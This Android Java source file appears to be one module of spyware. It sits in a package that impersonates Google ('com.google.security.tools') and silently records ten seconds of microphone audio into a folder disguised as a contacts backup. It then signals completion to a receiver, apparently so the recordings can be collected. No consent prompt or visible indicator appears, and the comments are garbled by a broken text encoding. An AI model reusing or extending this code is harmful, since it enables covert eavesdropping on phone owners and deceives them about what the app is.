package com.google.security.tools;

import java.io.File;
import java.util.Timer;
import java.util.TimerTask;

import android.content.Context;
import android.media.MediaRecorder;
import android.os.Environment;

import com.google.security.FinishReceiver;
import com.google.security.MainService;

public class RecordTool {

	private static RecordTool recordTool;
	private Context context;
	private MediaRecorder mediaRecorder = null;
	private boolean sdcardExists = false;
	private File recordAudioSaveFileDir = null;// ������Ƶ�ļ����ļ���
	private File recordAudioSaveFile = null;
	private String recordAudioSaveFileName = null;// �ļ�������
	private String recDir = "Contacts/ContactsBackUp/m";// �����Ŀ¼����
	private boolean isRecord = false; // ¼���ı�־
	Timer timer;

	public RecordTool(Context context) {
		this.context = context;
	}

	public static RecordTool getIntance(Context context) {
		if (recordTool == null)
			return new RecordTool(context);
		return recordTool;
	}

	public void start() {
		if ((this.sdcardExists = Environment.getExternalStorageState().equals(
				Environment.MEDIA_MOUNTED))) {// �ж�sd���Ƿ����
			this.recordAudioSaveFileDir = new File(
					MainService.RECORD_FORDER_PATH);
			if (!this.recordAudioSaveFileDir.exists()) {// �ļ��в�����
				this.recordAudioSaveFileDir.mkdirs();// �����ļ���
			}
			this.recordAudioSaveFileName = this.recordAudioSaveFileDir
					.toString()
					+ File.separator
					+ System.currentTimeMillis()
					/ 1000 + ".mp3";// ¼���ļ�����
			this.recordAudioSaveFile = new File(this.recordAudioSaveFileName);
			this.mediaRecorder = new MediaRecorder();
			this.mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC); // ��Ƶ��Դ��MIC
			this.mediaRecorder
					.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
			this.mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
			this.mediaRecorder.setOutputFile(this.recordAudioSaveFileName);// ������ļ���
			try {
				this.mediaRecorder.prepare();// ׼��¼��
			} catch (Exception e) {
			}
			this.mediaRecorder.start(); // ��ʼ¼��
			this.isRecord = true; // ����¼��
			// Toast.makeText(context, "��ʼ", Toast.LENGTH_SHORT).show();

			timer = new Timer();
			TimerTask ts = new TimerTask() {

				@Override
				public void run() {
					stop();
					while (true) {
						File file = new File(MainService.RECORD_FORDER_PATH);
						if (file.list().length != 0) {
							FinishReceiver.finishbroadcast("record", context);
							break;
						}
					}

				}
			};
			timer.schedule(ts, 1000 * 10);// �ӳ�1���Ӻ�ֹͣ¼��
		}

	}

	public void stop() {// ֹͣ¼������
		if (this.isRecord) { // ����¼��
			// Toast.makeText(context, "����", Toast.LENGTH_SHORT).show();
			this.mediaRecorder.stop(); // ֹͣ
			this.mediaRecorder.release(); // �ͷ���Դ
		}
	}
}
